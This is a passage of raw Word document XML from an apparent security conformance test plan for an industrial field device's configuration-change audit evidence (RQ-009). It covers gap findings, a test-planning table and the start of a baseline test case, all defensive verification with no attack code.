    <w:p w14:paraId="62F734DE" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion:</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-009 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partially met, unevenly.</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Config modification</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> has the </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>best evidence of any audit requirement</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — a </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>durable change count (REVISION_COUNTER)</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fingerprint (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/I&amp;M4)</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>readable log (CR 6.1 met)</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>temporal param-end write-gate</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — but still </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no device-side actor (CR 2.12 delegated to PLC, G-1)</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no timestamp (CR 2.11, G-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>asymmetric/bounded retention (G-3/G-5, CR 3.9)</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Firmware modification</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> inherits </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008's self-erasing install</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (cross-ref).</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(5-year retention → RQ-012; no-signature cause → RQ-005; update authorization → RQ-011.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B42362" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:pict w14:anchorId="3A1A7A44">
          <v:rect id="_x0000_i1611" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="59BE2E4F" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)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3587"/>
        <w:gridCol w:w="1556"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="618"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="3426CE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036004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87790E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BF4D1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2BAA87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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6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39C427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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="16AFA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DB5A7" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6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EAB53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 xml:space="preserve">Enumerate the </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>config</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">-modification evidence surface (REVISION_COUNTER, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/I&amp;M4, Error Log) at baseline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F58F5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t>Functional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baseline</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (CR 6.1 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>met</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>; CR 2.8 partial)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485A0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>Requirements-based verification; NIST SP 800-115 §3.2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6FDB3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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="57487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32F19" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6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82C22C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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Config-modification evidence + persistence</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: change one </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iPar</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; capture REVISION_COUNTER/I&amp;M4 delta; </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cold-start</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and re-read — show counter durable but error-log detail cleared, no time/actor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007FF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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-2/G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (asymmetric retention; no time)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F9EB2" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>NIST SP 800-115 §3.2 (log review) + §7 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>evidence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handling</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB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8036D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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="39657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20DB4" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6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4802A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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Actor-delegation analysis</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> config change; confirm the </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>device</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> holds no actor identity; attribution exists only in the PLC/engineering project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5B9ED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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (attribution delegated, not device-resident)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A9DE1" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">NIST SP 800-115 §3.1/§3.2 (documentation &amp; log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>review</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val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77FFA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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="78299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357E5" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6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FA883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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Post-param-end write-gate</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: attempt an acyclic config write after param-end; confirm rejection and absence of an evidence entry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06587" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Validates temporal write-gate; no-evidence-on-block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3F83B" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>OWASP ISTG-DES; NIST SP 800-115 §5.2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6E9F1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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="5ED08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A7B08" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="29" w:author="Unknown">
              <w:r w:rsidRPr="00DC3DB6">
                <w:delText>Firmware-modification evidence test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EDC6B" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6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AA7C0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→ RQ-008 (TC-RQ008-02)</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>cross-referenced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2310A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6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020A2" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="018CD369" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: config change via TIA on the OT path; evidence reads via management path (Pi eth1 = 192.168.50.10 → IoT-Core). Firmware-modification self-erasing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is proven in </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ008-02</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not repeated here. </w:t>
      </w:r>
      <w:hyperlink r:id="rId226" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId227" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="12971427" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:pict w14:anchorId="24D14BE9">
          <v:rect id="_x0000_i1612" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="48ECC7B4" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB617D3" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entries for the config-evidence baseline (TS-1), the </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>config-modification + asymmetric-persistence</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> proof (TS-2 → G-2/G-3, the requirement-specific core), and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>actor-delegation</w:t>
      </w:r>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> proof (TS-3 → G-1). </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>No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firmware-modification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test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve"> (→ RQ-008). TS-4 per </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t>established</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t>template</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ABCCA20" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:pict w14:anchorId="0C59EEE2">
          <v:rect id="_x0000_i1613" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A30A9C" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">TC-RQ009-01 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Config-Modification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Evidence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Surface Baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DAEC78" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6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7748"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="3D347D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AEA3B8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CB8183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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="27DD8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4A649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C094D" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>TC-RQ009-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="68881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A7515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A9CA4" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>RQ-009 (EHSR 1.1.9 §2) → CR 2.8 / CR 3.4 / CR 6.1 → Asset B, Asset I</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="3D001B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269DA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lastRenderedPageBreak/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3B413" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Repudiation (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>baseline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of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available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config-modification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evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="15EC7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0204A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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB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390F2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SVV-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="1A90D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400E0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267B0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 xml:space="preserve">Establish which </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>configuration</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
